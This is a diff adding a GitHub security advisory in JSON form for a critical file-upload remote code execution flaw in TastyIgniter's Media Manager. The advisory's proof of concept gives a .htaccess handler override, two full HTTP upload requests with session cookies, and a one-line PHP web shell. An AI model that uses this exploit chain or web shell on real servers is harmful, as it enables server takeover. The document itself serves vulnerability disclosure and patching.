@@ -1,0 +1,118 @@
+{
+  "ghsa_id": "GHSA-7wwv-x6mc-pxqx",
+  "cve_id": "CVE-2026-69179",
+  "url": "https://api.github.com/repos/tastyigniter/TastyIgniter/security-advisories/GHSA-7wwv-x6mc-pxqx",
+  "html_url": "https://github.com/tastyigniter/TastyIgniter/security/advisories/GHSA-7wwv-x6mc-pxqx",
+  "summary": "Remote Code Execution (RCE) via Unrestricted file upload in Media Manager",
+  "description": "### Summary\r\nMedia manager accepts `.htaccess` file which can be used to perform RCE.\r\n\r\n### Details\r\nThe file upload functionality from media manager somehow accepts `.htaccess` file. This file could be used to allow any extension to run PHP command. By doing so, it is possible to perform RCE.\r\n\r\n### PoC\r\n- Login as Admin\r\n- Create a `.htaccess` file with the following code.\r\n\r\n```\r\n<FilesMatch \"\\.jpg$\">\r\n    SetHandler application/x-httpd-php\r\n</FilesMatch>\r\n```\r\n- Upload the `.htaccess` file via the Media Manager.\r\n\r\nRequest\r\n```\r\nPOST /admin/media_manager HTTP/1.1\r\nHost: localhost:8888\r\nContent-Length: 357\r\nsec-ch-ua-platform: \"Linux\"\r\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\r\nCache-Control: no-cache\r\nAccept-Language: en-US,en;q=0.9\r\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\r\nsec-ch-ua-mobile: ?0\r\nX-IGNITER-FILEUPLOAD: mediamanager\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\r\nAccept: application/json\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE\r\nOrigin: http://localhost:8888\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\nReferer: http://localhost:8888/admin/media_manager\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6InF4RFZUdStuQkY0cGRLU2s4NUFiQ1E9PSIsInZhbHVlIjoiUjMyRUp6UGI3ZFRsL0dhY3pDSUhtMDJaY3Y5bXZ6SFlkQVR5MzZzdGZOT2ZRdExFQ1FJRUh5NDVmQlV0d0tNUXRackcxbTh0YWcxbHphV3dmTVdrNjR5aExhdzZUUFdLQ1JsSEhiMUlZRE1IblBuTFhmdVJWZFc5bFpicU4vS1BUZDh5OGRUMERTU1dsOEdnZVp0bXNpUFI5ZWFPM29RaGl3czU0cnlKczFsN0U4OGFnRWNjREM3aWFSRUtaYTVVTkRmSkV4RXlzZGRiK3RRcGVmOVk2dG1ud0NBaXVFTDRHRVM0Nk9MWDNaUT0iLCJtYWMiOiJiZjA3OGVhMjZlZjQ5ZDczNDkxYmQ3NDBmYWFmNGI5NjNkZDFkMmI0ODAwMTU2MmE5MjMwNjJlMzU0OGM1ODg5IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6Ikt6a2dhWG1oL3p4NFBlOUpUWTNLRGc9PSIsInZhbHVlIjoiaU1KZzErLzJoQ3dsSVRnbkptUE5YcmN6cFk1eVJoNWZlSVZzeFlqcVVlQThDWGc1S2FUS1hGMEFsa1Bsb0RvVE12T1VoTEdKOFpQRm5XMXMrSG1ONTI5T0U2UW5KMFAxRHRTWXA2eFNYSm9xaldlMkZrbHl5aSs3K21hQjBveWEiLCJtYWMiOiI5MzY4NzNhODQ3NjlkNDgzMzc0N2FkZjM0YTJjMDI5MTBhZjc3MmZiNzI2YTc3NTBmNWY2OTFiNTBmMGRlNDg4IiwidGFnIjoiIn0%3D; tastyigniter_session=eyJpdiI6ImpoQldjRHJMTlJCMXlxVWVnbmt4QUE9PSIsInZhbHVlIjoicS9nRENOZDgvRURBL2kvM1VSOTFmaFgzcEtyVVNZK3pMLzBxL2NnU3MwVUIvaW0zMmhacWRvYnMzUzF2NXhDenZ1MFZkK1ErZ0FscGlRUFVpMC80YlBKWHNyVDFCTWR6eFBXYUNTc0VCd3NGR1dxVGRWaWVCOU5QNzZVakpDT28iLCJtYWMiOiI3NGYxMGJkNjcyYWVjMGQ5YjQ2M2M1NjBjZmM0ZGRiM2IzODRjNjM3MmYwMjM3NThmMTM2YjQzYmMzYzExYTQ1IiwidGFnIjoiIn0%3D\r\nConnection: keep-alive\r\n\r\n------WebKitFormBoundaryN13ytndlhtodIsbE\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\n/\r\n------WebKitFormBoundaryN13ytndlhtodIsbE\r\nContent-Disposition: form-data; name=\"file_data\"; filename=\".htaccess\"\r\nContent-Type: image/png\r\n\r\n\r\n<FilesMatch \"\\.jpg$\">\r\n    SetHandler application/x-httpd-php\r\n</FilesMatch>\r\n------WebKitFormBoundaryN13ytndlhtodIsbE--\r\n```\r\n\r\n- Once this step is done, just upload a php file with `.jpg` extension to execute php code.\r\n\r\n```\r\nPOST /admin/media_manager HTTP/1.1\r\nHost: localhost:8888\r\nContent-Length: 310\r\nsec-ch-ua-platform: \"Linux\"\r\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\r\nCache-Control: no-cache\r\nAccept-Language: en-US,en;q=0.9\r\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\r\nsec-ch-ua-mobile: ?0\r\nX-IGNITER-FILEUPLOAD: mediamanager\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\r\nAccept: application/json\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE\r\nOrigin: http://localhost:8888\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\nReferer: http://localhost:8888/admin/media_manager\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6InF4RFZUdStuQkY0cGRLU2s4NUFiQ1E9PSIsInZhbHVlIjoiUjMyRUp6UGI3ZFRsL0dhY3pDSUhtMDJaY3Y5bXZ6SFlkQVR5MzZzdGZOT2ZRdExFQ1FJRUh5NDVmQlV0d0tNUXRackcxbTh0YWcxbHphV3dmTVdrNjR5aExhdzZUUFdLQ1JsSEhiMUlZRE1IblBuTFhmdVJWZFc5bFpicU4vS1BUZDh5OGRUMERTU1dsOEdnZVp0bXNpUFI5ZWFPM29RaGl3czU0cnlKczFsN0U4OGFnRWNjREM3aWFSRUtaYTVVTkRmSkV4RXlzZGRiK3RRcGVmOVk2dG1ud0NBaXVFTDRHRVM0Nk9MWDNaUT0iLCJtYWMiOiJiZjA3OGVhMjZlZjQ5ZDczNDkxYmQ3NDBmYWFmNGI5NjNkZDFkMmI0ODAwMTU2MmE5MjMwNjJlMzU0OGM1ODg5IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6Ikt6a2dhWG1oL3p4NFBlOUpUWTNLRGc9PSIsInZhbHVlIjoiaU1KZzErLzJoQ3dsSVRnbkptUE5YcmN6cFk1eVJoNWZlSVZzeFlqcVVlQThDWGc1S2FUS1hGMEFsa1Bsb0RvVE12T1VoTEdKOFpQRm5XMXMrSG1ONTI5T0U2UW5KMFAxRHRTWXA2eFNYSm9xaldlMkZrbHl5aSs3K21hQjBveWEiLCJtYWMiOiI5MzY4NzNhODQ3NjlkNDgzMzc0N2FkZjM0YTJjMDI5MTBhZjc3MmZiNzI2YTc3NTBmNWY2OTFiNTBmMGRlNDg4IiwidGFnIjoiIn0%3D; tastyigniter_session=eyJpdiI6ImpoQldjRHJMTlJCMXlxVWVnbmt4QUE9PSIsInZhbHVlIjoicS9nRENOZDgvRURBL2kvM1VSOTFmaFgzcEtyVVNZK3pMLzBxL2NnU3MwVUIvaW0zMmhacWRvYnMzUzF2NXhDenZ1MFZkK1ErZ0FscGlRUFVpMC80YlBKWHNyVDFCTWR6eFBXYUNTc0VCd3NGR1dxVGRWaWVCOU5QNzZVakpDT28iLCJtYWMiOiI3NGYxMGJkNjcyYWVjMGQ5YjQ2M2M1NjBjZmM0ZGRiM2IzODRjNjM3MmYwMjM3NThmMTM2YjQzYmMzYzExYTQ1IiwidGFnIjoiIn0%3D\r\nConnection: keep-alive\r\n\r\n------WebKitFormBoundaryN13ytndlhtodIsbE\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\n/\r\n------WebKitFormBoundaryN13ytndlhtodIsbE\r\nContent-Disposition: form-data; name=\"file_data\"; filename=\"test.jpg\"\r\nContent-Type: image/png\r\n\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------WebKitFormBoundaryN13ytndlhtodIsbE--\r\n```\r\n\r\n- in the example, we uploaded a `test.jpg`\r\n- execution the php code\r\n\r\n<img width=\"846\" height=\"205\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4da71cfb-65f6-4580-9bb8-b352713451d9\" />\r\n\r\n\r\n### Impact\r\nAttacker with admin access could abuse this vulnerability to run command directly in the server.\r\n",
+  "severity": "critical",
+  "author": null,
+  "publisher": {
+    "login": "sampoyigi",
+    "id": 6567634,
+    "node_id": "MDQ6VXNlcjY1Njc2MzQ=",
+    "avatar_url": "https://avatars.githubusercontent.com/u/6567634?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/sampoyigi",
+    "html_url": "https://github.com/sampoyigi",
+    "followers_url": "https://api.github.com/users/sampoyigi/followers",
+    "following_url": "https://api.github.com/users/sampoyigi/following{/other_user}",
+    "gists_url": "https://api.github.com/users/sampoyigi/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/sampoyigi/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/sampoyigi/subscriptions",
+    "organizations_url": "https://api.github.com/users/sampoyigi/orgs",
+    "repos_url": "https://api.github.com/users/sampoyigi/repos",
+    "events_url": "https://api.github.com/users/sampoyigi/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/sampoyigi/received_events",
+    "type": "User",
+    "user_view_type": "public",
+    "site_admin": false
+  },
+  "identifiers": [
+    {
+      "value": "GHSA-7wwv-x6mc-pxqx",
+      "type": "GHSA"
+    },
+    {
+      "value": "CVE-2026-69179",
+      "type": "CVE"
+    }
+  ],
+  "state": "published",
+  "created_at": null,
+  "updated_at": "2026-08-03T18:59:03Z",
+  "published_at": "2026-07-06T10:56:34Z",
+  "closed_at": null,
+  "withdrawn_at": null,
+  "submission": null,
+  "vulnerabilities": [
+    {
+      "package": {
+        "ecosystem": "",
+        "name": ""
+      },
+      "vulnerable_version_range": "<= v4.2.4",
+      "patched_versions": "v4.3.1",
+      "vulnerable_functions": [
+
+      ]
+    }
+  ],
+  "cvss_severities": {
+    "cvss_v3": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.1
+    },
+    "cvss_v4": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  "cwes": [
+
+  ],
+  "cwe_ids": [
+
+  ],
+  "credits": [
+    {
+      "login": "callmeks",
+      "type": "reporter"
+    }
+  ],
+  "credits_detailed": [
+    {
+      "user": {
+        "login": "callmeks",
+        "id": 88197307,
+        "node_id": "MDQ6VXNlcjg4MTk3MzA3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/88197307?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/callmeks",
+        "html_url": "https://github.com/callmeks",
+        "followers_url": "https://api.github.com/users/callmeks/followers",
+        "following_url": "https://api.github.com/users/callmeks/following{/other_user}",
+        "gists_url": "https://api.github.com/users/callmeks/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/callmeks/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/callmeks/subscriptions",
+        "organizations_url": "https://api.github.com/users/callmeks/orgs",
+        "repos_url": "https://api.github.com/users/callmeks/repos",
+        "events_url": "https://api.github.com/users/callmeks/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/callmeks/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "type": "reporter",
+      "state": "accepted"
+    }
+  ],
+  "collaborating_users": null,
+  "collaborating_teams": null,
+  "private_fork": null,
+  "comments": 1,
+  "cvss": {
+    "vector_string": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
+    "score": 9.1
+  }
+}
